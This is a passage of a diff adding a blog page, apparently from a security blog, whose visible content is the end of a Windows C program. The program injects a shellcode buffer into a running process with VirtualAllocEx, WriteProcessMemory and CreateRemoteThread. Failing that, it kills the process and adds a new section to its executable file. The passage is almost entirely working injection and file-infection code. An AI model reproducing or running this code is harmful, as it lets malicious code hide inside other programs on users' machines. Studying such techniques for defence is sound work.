+        if(!ReadProcessMemory(my_exe,(Target_Base_addr+(DWORD)IDH.e_lfanew),&amp;INH,sizeof(IMAGE_NT_HEADERS),&amp;nbytes) || nbytes != sizeof(IMAGE_NT_HEADERS) || INH.Signature != IMAGE_NT_SIGNATURE)
+        {
+            fprintf(stderr,"\n error in reading the IMAGE_NT_HEADERS \n");
+            ExitProcess(-1) ;
+        }
+        LPVOID shell_addr = NULL ;
+        //check if there is enough room for the shellcode
+        shell_addr =  VirtualAllocEx(my_exe,0,sizeof(l0phtTN_shellcode),MEM_COMMIT,PAGE_EXECUTE_READWRITE) ;
+        if(shell_addr == NULL )
+        {
+            fprintf(stderr,"something aint right with virtualallocEx");
+            ExitProcess(-1);
+        }
+        //store the L0phtTn shellcode
+        if(!WriteProcessMemory(my_exe,shell_addr,l0phtTN_shellcode,sizeof(l0phtTN_shellcode),&amp;nbytes) &amp;&amp; nbytes != sizeof(l0phtTN_shellcode) )
+        {
+            fprintf(stderr ,"cannot write into memory !");
+            ExitProcess(-1);
+        }
+
+        HANDLE r_handle ;
+        // trigger the shellcode
+        r_handle =  CreateRemoteThread(my_exe,NULL,0,(LPTHREAD_START_ROUTINE)shell_addr,0,0,0) ;
+        if(r_handle == INVALID_HANDLE_VALUE )
+        {
+            puts("cannot execute shellcode !!");
+            ExitProcess(-1);
+        }
+        exit(0) ;
+    }
+    else
+    {
+
+        char * tokill = (char * )malloc(sizeof(char) * 24);
+        //the target must be closed in order to add the new section !!
+        sprintf(tokill,"taskkill /F /IM %d",pid);
+        *(tokill + 23) = '\0' ;
+        system(tokill);
+        AddL0phtTnSection(pathh);
+        Sleep(500) ;
+
+    }
+    system("pause");
+    return 0 ;
+}
+</code></pre>
+
+            </section>
+
+        </article>
+    </main>
+    <footer class="site-footer clearfix">
+        <section class="copyright"><a href="../../index.html">Mohamed Ali Mrabet </a> &copy; 2019</section>
+        <section class="poweredby">Proudly published with <a href="https://ghost.org">Ghost</a></section>
+    </footer>
+</body>
+</html>
